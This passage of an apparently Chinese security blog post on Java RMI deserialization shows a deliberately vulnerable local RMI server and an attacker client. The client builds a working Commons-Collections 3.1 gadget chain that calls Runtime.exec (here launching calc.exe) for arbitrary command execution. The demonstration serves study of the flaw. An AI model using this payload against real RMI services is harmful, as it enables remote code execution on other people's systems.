class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">UserImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">User</span></span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">protected</span> <span class="title">UserImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> String <span class="title">name</span><span class="params">(String name)</span> <span class="keyword">throws</span> RemoteException</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">say</span><span class="params">(String say)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"you speak"</span> + say);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">dowork</span><span class="params">(Object work)</span> <span class="keyword">throws</span>  RemoteException</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">"your work is "</span> + work);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        UserImpl user = <span class="keyword">new</span> UserImpl();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.bind(url,user);</span><br><span class="line">        System.out.println(<span class="string">"the rmi is running ..."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>服务端具有以下特点：</p>
+<ul>
+<li>jdk版本1.7</li>
+<li>使用具有漏洞的Commons-Collections3.1组件</li>
+<li>RMI提供的数据有Object类型（因为攻击payload就是Object类型）</li>
+</ul>
+<p>客户端（攻击者）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> RMI;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> RMI.Server.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        String url = <span class="string">"rmi://127.0.0.1:1099/User"</span>;</span><br><span class="line">        User userClient = (User)Naming.lookup(url);</span><br><span class="line"></span><br><span class="line">        System.out.println(userClient.name(<span class="string">"lala"</span>));</span><br><span class="line">        userClient.say(<span class="string">"world"</span>);</span><br><span class="line">        userClient.dowork(getpayload());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map.put(<span class="string">"value"</span>, <span class="string">"lala"</span>);</span><br><span class="line">        Map transformedMap = TransformedMap.decorate(map, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        Class cl = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object instance = ctor.newInstance(Target.class, transformedMap);</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>亲测可弹计算机，完成任意命令执行。<br><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g7y6plwx8hj31h218wwq0.jpg" alt="计算器.png"></p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://stuff.mit.edu/afs/athena/software/java/java_v1.2.2/distrib/sun4x_56/docs/guide/rmi/getstart.doc.html#7738" target="_blank" rel="noopener">RMI官方文档</a><br><a href="https://xz.aliyun.com/t/4711#toc-3" target="_blank" rel="noopener">https://xz.aliyun.com/t/4711#toc-3</a></p>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>加载评论需要在浏览器启用 JavaScript 脚本支持。</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RMI"><span class="toc-number">2.</span> <span class="toc-text">RMI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI远程对象部署-调用流程"><span class="toc-number">2.1.</span> <span class="toc-text">RMI远程对象部署-调用流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI服务端与客户端实现"><span class="toc-number">2.2.</span> <span class="toc-text">RMI服务端与客户端实现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#通讯细节-反序列化"><span class="toc-number">2.3.</span> <span class="toc-text">通讯细节-反序列化</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RMI利用点"><span class="toc-number">2.4.</span> <span class="toc-text">RMI利用点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#直接攻击RMI服务器-Commons-collections3-1"><span class="toc-number">2.5.</span> <span class="toc-text">直接攻击RMI服务器 Commons-collections3.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://lalajun.com/2019/10/15/RMI 反序列化/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://lalajun.com/2019/10/15/RMI 反序列化/&text=RMI 反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://lalajun.com/2019/10/15/RMI 反序列化/&is_video=false&description=RMI 反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=RMI 反序列化&body=Check out this article: http://lalajun.com/2019/10/15/RMI 反序列化/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://lalajun.com/2019/10/15/RMI 反序列化/&title=RMI 反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://lalajun.com/2019/10/15/RMI 反序列化/&name=RMI 反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 LaLa
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/search/">搜索</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/friends/">友链</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+    <!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<!-- clipboard -->
+
+  <script src="/lib/clipboard/clipboard.min.js"></script>
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Disqus Comments -->
+
+    <script type="text/javascript">
+        var disqus_shortname = 'lalajun';
+
+        (function(){
+            var dsq = document.createElement('script');
+            dsq.type = 'text/javascript';
+            dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        }());
+    </script>
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/wanko.model.json"},"display":{"position":"right","width":150,"height":300,"hOffset":30,"vOffset":-70},"mobile":{"show":false},"log":false});</script></body>
+</html>
